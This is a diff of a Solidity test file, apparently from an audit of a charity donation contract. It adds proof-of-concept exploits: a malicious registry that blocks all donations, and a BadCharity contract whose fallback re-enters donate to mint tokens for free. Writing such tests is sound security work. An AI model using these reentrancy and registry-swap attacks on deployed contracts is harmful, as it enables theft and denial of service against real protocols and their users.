@@ -126,20 +126,52 @@ contract GivingThanksTest is Test {
         charityContract.donate{ value: 1 ether }(charity);
     }
 
-    function testAnyoneCanUpdateRegistry() public {
-        address badCharity = makeAddr("badCharity");
-        BadRegistry badRegistry = new BadRegistry();
+    function testRegistryUpdateDOS() public {
+        RegistryDOS badRegistry = new RegistryDOS();
         charityContract.updateRegistry(address(badRegistry));
-        registryContract.registerCharity(badCharity);
         vm.deal(donor, 10 ether);
         vm.prank(donor);
-        charityContract.donate{ value: 1 ether }(badCharity);
-        assertEq(badCharity.balance, 1 ether);
+        vm.expectRevert(bytes("Charity not verified"));
+        charityContract.donate{ value: 1 ether }(charity);
+    }
+
+    function testRegistryUpdateReentrancy() public {
+        BadCharity badCharity = new BadCharity(address(charityContract));
+
+        RegistryBypasser badRegistry = new RegistryBypasser();
+        charityContract.updateRegistry(address(badRegistry));
+        //donor or attacker the bad charity will mint N tokens anyways.
+        vm.deal(donor, 1 ether);
+        vm.prank(donor);
+        charityContract.donate{ value: 0 }(address(badCharity));
     }
 }
 
-contract BadRegistry {
+contract RegistryDOS {
+    function isVerified(address) public pure returns (bool) {
+        return false;
+    }
+}
+
+contract RegistryBypasser {
     function isVerified(address) public pure returns (bool) {
         return true;
+    }
+}
+
+contract BadCharity {
+    uint256 times;
+    GivingThanks protocol;
+
+    constructor(address _protocol) {
+        protocol = GivingThanks(_protocol);
+    }
+
+    fallback() external payable {
+        //desired times
+        if (times < 10) {
+            times = times + 1;
+            protocol.donate{ value: 0 }(address(this));
+        }
     }
 }
